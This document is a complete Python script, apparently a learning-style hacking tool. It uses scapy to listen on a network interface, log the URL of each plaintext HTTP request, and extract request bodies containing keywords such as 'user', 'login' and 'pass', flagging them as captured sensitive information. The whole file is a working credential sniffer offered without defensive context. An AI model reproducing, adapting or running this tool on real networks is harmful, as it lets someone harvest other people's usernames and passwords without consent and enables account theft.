#!/usr/bin/env python
import optparse
import scapy.all as scapy
from scapy.layers import http

keywords = ["user", "login", "pass", "name", "mail"]


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to listen on")
    option = parser.parse_args()[0]
    if not option.interface:
        parser.error("[-] Please specify an interface to listen on, use --help for more info")
    return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword in str(load).lower():
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("\033[1;32;49m" + "[+] http request >> " + "\033[1;37;49m" + get_url(packet))
        sensitive_info = get_login_info(packet)
        if sensitive_info:
            print("\033[1;31;49m" + "[+] Sensitive Information >> " + "\033[1;37;49m" + sensitive_info)


if __name__ == "__main__":
    option = get_arguments()
    sniff(option.interface)
